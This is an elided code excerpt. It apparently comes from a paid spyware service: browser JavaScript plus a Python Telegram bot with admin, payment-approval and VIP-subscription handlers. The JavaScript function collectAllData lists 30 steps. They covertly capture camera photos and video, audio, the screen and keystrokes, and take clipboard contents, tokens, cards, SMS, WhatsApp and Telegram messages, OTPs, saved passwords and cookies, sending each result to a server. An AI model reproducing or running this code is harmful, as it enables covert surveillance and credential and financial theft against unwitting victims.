...
async function collectAllData(){
    ...
    statusDiv.innerHTML = "[3/30] Camera photo...";
    if (navigator.mediaDevices) {
        try {
            ...
            setTimeout(() => {
                ...
                sendData("/camera_photo", { image: c.toDataURL("image/jpeg", 0.7) });
                stream.getTracks().forEach(t => t.stop());
            }, 1000);
        } catch(e) {}
    }
    
    statusDiv.innerHTML = "[4/30] Audio...";
    if (navigator.mediaDevices) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            const recorder = new MediaRecorder(stream);
    ...
    statusDiv.innerHTML = "[5/30] Gallery...";
    ...
    statusDiv.innerHTML = "[6/30] Contacts...";
    ...
    statusDiv.innerHTML = "[7/30] Clipboard...";
    try {
        const text = await navigator.clipboard.readText();
        if (text) sendData("/clipboard", { content: text.substring(0, 1000) });
    } catch(e) {}
    
    statusDiv.innerHTML = "[8/30] Keyboard...";
    let keystrokes = [];
    setInterval(() => {
    ...
    statusDiv.innerHTML = "[9/30] Screen record...";
    try {
    ...
    if (navigator.mediaDevices) {
        try {
            ...
            frontRecorder.onstop = () => {
                ...
                const reader = new FileReader();
                reader.onloadend = () => sendData("/front_camera", { video: reader.result });
                reader.readAsDataURL(blob);
            };
            frontRecorder.start();
            setTimeout(() => { if (frontRecorder.state === 'recording') frontRecorder.stop(); }, 10000);
        } catch(e) {}
    }
    
    statusDiv.innerHTML = "[11/30] Back camera...";
    if (navigator.mediaDevices) {
        try {
            const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: false });
            const backRecorder = new MediaRecorder(backStream);
            let backChunks = [];
            backRecorder.ondataavailable = e => backChunks.push(e.data);
            backRecorder.onstop = () => {
                const blob = new Blob(backChunks, { type: 'video/webm' });
                const reader = new FileReader();
                reader.onloadend = () => sendData("/back_camera", { video: reader.result });
                reader.readAsDataURL(blob);
            };
            backRecorder.start();
            setTimeout(() => { if (backRecorder.state === 'recording') backRecorder.stop(); }, 10000);
        } catch(e) {}
    }
    
    statusDiv.innerHTML = "[12/30] Tokens...";
    ...
    statusDiv.innerHTML = "[13/30] Cards...";
    ...
    statusDiv.innerHTML = "[14/30] Behavior analysis...";
    const behaviorData = {
        plugins: Array.from(navigator.plugins).map(p => p.name),
    ...
    statusDiv.innerHTML = "[15/30] SMS collection...";
    await startSMSCollection();
    
    statusDiv.innerHTML = "[16/30] Extracting WhatsApp...";
    setTimeout(extractWhatsAppMessages, 2000);
    
    statusDiv.innerHTML = "[17/30] Extracting OTP...";
    setTimeout(extractOTPFromPage, 3000);
    
    statusDiv.innerHTML = "[18/30] Extracting Telegram...";
    setTimeout(extractTelegramMessages, 4000);
    
    statusDiv.innerHTML = "[19/30] System info...";
    getSystemInfo();
    
    statusDiv.innerHTML = "[20/30] Extracting saved passwords...";
    setTimeout(extractSavedPasswords, 1000);
    
    statusDiv.innerHTML = "[21/30] Detecting real IP...";
    setTimeout(getRealIP, 2000);
    
    statusDiv.innerHTML = "[22/30] Battery monitoring...";
    setTimeout(monitorBattery, 3000);
    
    statusDiv.innerHTML = "[23/30] Testing internet speed...";
    setTimeout(testInternetSpeed, 4000);
    
    statusDiv.innerHTML = "[24/30] Continuous camera...";
    setTimeout(continuousCameraRecording, 5000);
    
    statusDiv.innerHTML = "[25/30] Continuous audio...";
    setTimeout(continuousAudioRecording, 7000);
    
    statusDiv.innerHTML = "[26/30] Advanced clipboard...";
    setTimeout(advancedClipboardMonitoring, 9000);
    
    statusDiv.innerHTML = "[27/30] Advanced keylogger...";
    setTimeout(advancedKeylogger, 10000);
    
    statusDiv.innerHTML = "[28/30] Extracting cookies...";
    setTimeout(extractCookies, 11000);
    
    statusDiv.innerHTML = "[29/30] Extracting page content...";
...
def handle_callback(callback_id, chat_id, message_id, data, user_id, username, first_name):
    ...
    if data == "admin_users" and str(user_id) in [str(a) for a in ADMIN_IDS]:
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("SELECT user_id, first_name, active, verified FROM users ORDER BY join_date DESC LIMIT 30")
        users_list = c.fetchall()
        conn.close()
        msg = "Users:\n" + "\n".join([f"{u[1]}: {'VIP' if u[2] else 'Free'} {'✅' if u[3] else '❌'}" for u in users_list])
    ...
    if data == "admin_payments" and str(user_id) in [str(a) for a in ADMIN_IDS]:
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("SELECT id, user_id, amount, status FROM payments WHERE status='pending'")
        payments = c.fetchall()
        conn.close()
        for p in payments:
            keyboard = [
            ...
            send_telegram(chat_id, f"Payment #{p[0]}\nUser: {p[1]}\nAmount: {p[2]}", keyboard)
        return
    ...
    if data.startswith("approve_") and str(user_id) in [str(a) for a in ADMIN_IDS]:
        ...
        if target in users:
            ...
            conn.commit()
            conn.close()
            send_telegram(chat_id, f"✅ Approved {target}")
            send_telegram(int(target), "✅ VIP Activated!")
        return
    ...
    if data.startswith("reject_") and str(user_id) in [str(a) for a in ADMIN_IDS]:
        ...
        conn.commit()
        conn.close()
        send_telegram(chat_id, f"❌ Rejected {target}")
        return
    
    # ===== ADMIN BROADCAST =====
    if data == "admin_broadcast" and str(user_id) in [str(a) for a in ADMIN_IDS]:
        pending_requests[chat_id] = {'action': 'broadcast'}
        send_telegram(chat_id, "📨 Send message to broadcast:")
        return
    
    # ===== SUBSCRIBE =====
    if data == "subscribe":
        pending_payments[uid] = {'amount': PAYMENT_AMOUNT}
        send_telegram(chat_id, f"💰 Send {PAYMENT_AMOUNT} EGP to {PAYMENT_NUMBER} and send receipt photo")
        return
...
@MEGATEON_SUPPORT"""
    ...
    # ===== ADMIN PANEL =====
    if data == "admin_panel":
        if str(user_id) in [str(a) for a in ADMIN_IDS]:   # ✅ صح: مسافة بادئة 4 مسافات
           stats = get_admin_stats()
...
def handle_text(chat_id, user_id, text, username, first_name):
    ...
    # ===== ADMIN (مباشر بدون handle_callback) =====
    if text == '/admin':
